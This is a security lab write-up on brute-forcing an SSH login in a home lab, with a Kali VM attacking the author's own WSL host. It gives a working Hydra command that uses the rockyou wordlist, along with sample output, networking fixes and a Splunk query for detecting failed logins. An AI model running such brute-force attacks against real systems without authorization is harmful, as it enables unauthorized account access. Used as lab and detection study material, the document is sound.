# 🔐 Brute-Force Login Attack – Real Lab (Kali Hydra)

## 📌 What is Brute-Force Login?

Brute-force login attacks occur when an attacker tries to guess a user’s password by systematically trying many combinations. This is often the first step in gaining unauthorized access.

---

## 🛠️ Lab Setup

| Role      | System           | IP Address         |
|-----------|------------------|--------------------|
| Attacker  | Kali Linux (VM)  | 192.168.15.130     |
| Target    | WSL Ubuntu (Host) | 172.21.48.121      |

- Kali is running in **VMware**
- WSL Ubuntu is the **target**, with OpenSSH enabled

---

## 🔧 Command Used

```bash
hydra -l sanidhyamalhotra -P /usr/share/wordlists/rockyou.txt ssh://172.21.48.121 -t 4
```

### Explanation:
- `-l` → login/username
- `-P` → path to password list
- `ssh://` → target protocol and IP
- `-t 4` → use 4 parallel tasks

---

## 📄 Sample Output

```plaintext
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
Hydra starting at 2025-05-27 02:13:35
[DATA] attacking ssh://172.21.48.121:22/
[STATUS] 72.00 tries/min, 72 tries in 00:01h...
[STATUS] 456 tries in 00:07h, 14343943 left...
```

---

## ⚠️ Challenges Faced

### 🔹 Issue: Network Not Reachable
Hydra showed:
```
[ERROR] could not connect to ssh://<ip> - Network is unreachable
```

### 🔹 Fix:
- Ensure SSH server is running (`sudo service ssh start`)
- Use **NAT** networking in VMware if Bridged doesn't work
- Make sure target IP (e.g., WSL IP) is reachable from Kali
- Firewall must allow port `22`

✅ In my case, **switching Kali to NAT mode fixed the problem**

---

## 🧠 Detection Strategy (in logs or Splunk)

Repeated login failures like:

```log
[2025-05-27 02:00:00] Failed login for user: admin from 192.168.15.130
```

### SPL Detection Query:
```spl
index=auth_logs "Failed login"
| stats count by src_ip, user
| where count > 5
```

---

## 📁 Collected Artifacts

| File | Description |
|------|-------------|
| `brute_force_log.log` | Output from Hydra scan |
| `hydra_scan.png`      | Screenshot of Hydra running |